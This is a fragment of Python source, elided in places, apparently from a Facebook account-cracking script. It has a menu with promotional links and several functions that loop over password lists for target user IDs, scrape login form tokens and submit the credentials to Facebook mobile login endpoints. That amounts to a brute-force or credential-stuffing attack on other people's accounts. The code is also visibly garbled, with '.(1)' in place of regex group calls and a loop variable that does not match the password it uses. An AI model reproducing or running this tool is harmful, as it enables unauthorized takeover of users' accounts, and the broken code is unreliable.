...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				...
				os.system('xdg-open https://chat.p.com/GRCLEUOREdd1SDMTX1TsKk')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def api6(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
...
def api7(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
...
def api8(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
...
def trt6(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).(1),
			"try_number":"0",
